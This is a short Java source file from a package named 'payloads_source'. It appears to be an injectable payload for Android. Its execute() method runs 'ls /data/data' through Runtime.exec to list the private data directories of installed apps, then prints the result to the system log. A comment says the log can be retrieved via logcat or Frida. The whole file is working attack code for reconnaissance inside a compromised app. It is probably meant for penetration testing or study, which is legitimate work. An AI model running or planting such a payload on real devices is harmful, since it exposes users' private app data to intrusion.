package payloads_source;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Payload {
    public void execute() {
        try {
            StringBuilder output = new StringBuilder();
            Process process = Runtime.getRuntime().exec("ls /data/data");

            BufferedReader reader = new java.io.BufferedReader(
                new InputStreamReader(process.getInputStream())
            );

            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }

            // Print output to system log (retrievable via logcat or Frida)
            System.out.println("[Payload Output]\n" + output.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}